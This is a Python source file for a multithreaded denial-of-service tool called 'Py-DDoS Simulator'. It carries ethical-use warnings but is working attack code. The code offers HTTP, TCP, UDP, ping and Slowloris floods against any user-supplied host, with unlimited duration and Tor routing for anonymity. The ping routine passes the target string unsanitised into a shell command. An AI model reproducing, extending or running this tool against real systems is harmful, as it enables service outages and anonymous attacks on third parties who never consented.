#!/usr/bin/env python3
"""
Py-DDoS Simulator - Ethical Cybersecurity Demonstration Tool
Author: voltsparx
Contact: voltsparx@gmail.com

WARNING: This tool is designed for educational purposes and ethical security testing only.
Unauthorized use against any network or system without explicit permission is illegal.
Use responsibly and only in controlled environments you own or have written permission to test.
"""

import threading
import time
import socket
import random
import os
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

# Try to import rich for enhanced UI, fallback to standard if not available
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, BarColumn, TextColumn
    from rich.table import Table
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

class DDoSSimulator:
    def __init__(self):
        self.attack_active = False
        self.attack_type = ""
        self.target_host = ""
        self.target_port = 0
        self.thread_count = 0
        self.duration = 0
        self.use_tor = False
        self.requests_sent = 0
        self.start_time = 0
        self.console = Console() if RICH_AVAILABLE else None

    def display_banner(self):
        banner_text = (
            "[bold magenta]\n"
            "╔══════════════════════════════════════════════════════════════╗\n"
            "║                 Py-DDoS Simulator v2.0                       ║\n"
            "║                 Ethical Demonstration Tool                   ║\n"
            "║                                                              ║\n"
            "║                 Author: voltsparx                            ║\n"
            "║                 Contact: voltsparx@gmail.com                 ║\n"
            "╚══════════════════════════════════════════════════════════════╝\n[/bold magenta]"
        )
        if RICH_AVAILABLE:
            self.console.print(Panel(banner_text, style="bold magenta", expand=False))
        else:
            print(banner_text)

    def display_warning(self):
        warning_text = (
            "[bold red]\n"
            "╔══════════════════════════════════════════════════════════════╗\n"
            "║                         WARNING                              ║\n"
            "║══════════════════════════════════════════════════════════════║\n"
            "║ This tool is for educational and ethical testing purposes    ║\n"
            "║ only. Unauthorized use against networks you don't own or     ║\n"
            "║ have explicit permission to test is ILLEGAL.                 ║\n"
            "║                                                              ║\n"
            "║ By using this tool, you agree that you are solely            ║\n"
            "║ responsible for any consequences resulting from its use.     ║\n"
            "║ The author assumes no liability for misuse of this tool.     ║\n"
            "╚══════════════════════════════════════════════════════════════╝\n[/bold red]"
        )
        if RICH_AVAILABLE:
            self.console.print(Panel(warning_text, style="bold red", expand=False))
        else:
            print(warning_text)
        input("Press Enter to acknowledge this warning and continue...")

    def configure_tor(self):
        """Configure Tor proxy settings"""
        self.use_tor = input("Use Tor for anonymity? (y/n): ").lower() == 'y'
        if self.use_tor:
            self.tor_proxy = "socks5://127.0.0.1:9050"
            print("[+] Tor proxy enabled")
        else:
            self.tor_proxy = None

    def get_target_info(self):
        """Get target information from user"""
        print("\n" + "="*50)
        print("TARGET CONFIGURATION")
        print("="*50)

        self.target_host = input("Target host/IP: ").strip()
        if self.target_host in ['localhost', '127.0.0.1', '0.0.0.0']:
            print("[!] Warning: Targeting localhost - make sure you have a test server running")

        print("\nAvailable attack vectors:")
        print("1. HTTP/HTTPS Flood")
        print("2. TCP SYN Flood")
        print("3. UDP Flood")
        print("4. ICMP Flood (requires admin/root)")
        print("5. Slowloris (Low-bandwidth attack)")

        choice = input("Select attack type (1-5): ").strip()
        attack_types = {
            '1': 'HTTP',
            '2': 'TCP',
            '3': 'UDP',
            '4': 'ICMP',
            '5': 'SLOWLORIS'
        }
        self.attack_type = attack_types.get(choice, 'HTTP')

        if self.attack_type == 'HTTP':
            self.target_port = int(input("Target port (80 for HTTP, 443 for HTTPS): ") or "80")
        elif self.attack_type == 'TCP':
            self.target_port = int(input("Target port: ") or "80")
        elif self.attack_type == 'UDP':
            self.target_port = int(input("Target port: ") or "53")
        elif self.attack_type == 'ICMP':
            self.target_port = 0
        elif self.attack_type == 'SLOWLORIS':
            self.target_port = int(input("Target port (typically 80): ") or "80")

        self.thread_count = int(input("Number of threads (50-500): ") or "100")
        self.duration = int(input("Attack duration in seconds (0 for unlimited): ") or "60")

    def http_flood(self):
        """HTTP/HTTPS flood attack"""
        url = f"{'https' if self.target_port == 443 else 'http'}://{self.target_host}:{self.target_port}"
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        session = requests.Session()
        if self.use_tor:
            session.proxies = {
                'http': self.tor_proxy,
                'https': self.tor_proxy
            }
        while self.attack_active:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                verify_ssl = False if self.target_port == 443 else True
                session.get(url, headers=headers, timeout=5, verify=verify_ssl)
                self.requests_sent += 1
            except Exception:
                pass

    def tcp_flood(self):
        """TCP SYN flood attack"""
        while self.attack_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_host, self.target_port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\n\r\n")
                self.requests_sent += 1
                s.close()
            except Exception:
                pass

    def udp_flood(self):
        """UDP flood attack"""
        data = random._urandom(1024)
        while self.attack_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (self.target_host, self.target_port))
                self.requests_sent += 1
                s.close()
            except Exception:
                pass

    def icmp_flood(self):
        """ICMP/Ping flood (requires root privileges on Unix systems)"""
        try:
            while self.attack_active:
                if os.name == 'nt':
                    os.system(f"ping -n 1 -w 1000 {self.target_host} > nul")
                else:
                    os.system(f"ping -c 1 -W 1 {self.target_host} > /dev/null 2>&1")
                self.requests_sent += 1
        except Exception:
            print("[!] ICMP flood may require administrator/root privileges")

    def slowloris(self):
        """Slowloris attack - keeps many connections open"""
        sockets = []
        try:
            for i in range(200):
                if not self.attack_active:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target_host, self.target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {self.target_host}\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n".encode())
                    s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                    s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
                    s.send("Connection: keep-alive\r\n".encode())
                    sockets.append(s)
                except Exception:
                    break
            while self.attack_active:
                for s in sockets[:]:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.requests_sent += 1
                    except Exception:
                        sockets.remove(s)
                        try:
                            s.close()
                        except Exception:
                            pass
                time.sleep(10)
        finally:
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass

    def monitor_attack(self):
        """Display attack statistics in real-time"""
        start_time = time.time()
        last_count = 0
        try:
            while self.attack_active:
                elapsed = time.time() - start_time
                current_count = self.requests_sent
                requests_per_second = (current_count - last_count)
                last_count = current_count

                os.system('cls' if os.name == 'nt' else 'clear')

                if RICH_AVAILABLE:
                    status_table = Table(title="Attack Status", show_header=True, header_style="bold magenta")
                    status_table.add_column("Metric", style="cyan")
                    status_table.add_column("Value", style="green")
                    status_table.add_row("Target", f"{self.target_host}:{self.target_port}")
                    status_table.add_row("Attack Type", self.attack_type)
                    status_table.add_row("Threads", str(self.thread_count))
                    status_table.add_row("Duration", f"{int(elapsed)}s / {self.duration}s" if self.duration > 0 else f"{int(elapsed)}s / Unlimited")
                    status_table.add_row("Requests Sent", str(self.requests_sent))
                    status_table.add_row("Req/Sec", f"{requests_per_second:.1f}")
                    status_table.add_row("Tor", "Enabled" if self.use_tor else "Disabled")
                    self.console.print(status_table)
                else:
                    print(f"Target: {self.target_host}:{self.target_port}")
                    print(f"Attack Type: {self.attack_type}")
                    print(f"Threads: {self.thread_count}")
                    print(f"Duration: {int(elapsed)}s / {self.duration if self.duration > 0 else 'Unlimited'}s")
                    print(f"Requests Sent: {self.requests_sent}")
                    print(f"Requests/Sec: {requests_per_second:.1f}")
                    print(f"Tor: {'Enabled' if self.use_tor else 'Disabled'}")

                if self.duration > 0 and elapsed >= self.duration:
                    self.attack_active = False
                    print("\n[+] Attack completed (duration reached)")
                time.sleep(1)
        except KeyboardInterrupt:
            self.attack_active = False
            print("\n[!] Attack stopped by user")

    def start_attack(self):
        """Start the DDoS simulation"""
        self.attack_active = True
        self.requests_sent = 0

        attack_methods = {
            'HTTP': self.http_flood,
            'TCP': self.tcp_flood,
            'UDP': self.udp_flood,
            'ICMP': self.icmp_flood,
            'SLOWLORIS': self.slowloris
        }
        attack_method = attack_methods.get(self.attack_type)
        if not attack_method:
            print("[!] Invalid attack type selected")
            return

        print(f"\n[+] Starting {self.attack_type} attack on {self.target_host}:{self.target_port}")
        print(f"[+] Using {self.thread_count} threads")
        print(f"[+] Press Ctrl+C to stop the attack\n")
        time.sleep(2)

        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()

        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            for _ in range(self.thread_count):
                executor.submit(attack_method)

        try:
            while self.attack_active:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.attack_active = False
            print("\n[!] Attack stopped by user")

        print("\n[+] Attack finished")
        print(f"[+] Total requests sent: {self.requests_sent}")

    def run(self):
        """Main method to run the tool"""
        self.display_banner()
        self.display_warning()
        self.configure_tor()
        self.get_target_info()
        self.start_attack()

if __name__ == "__main__":
    simulator = DDoSSimulator()
    simulator.run()
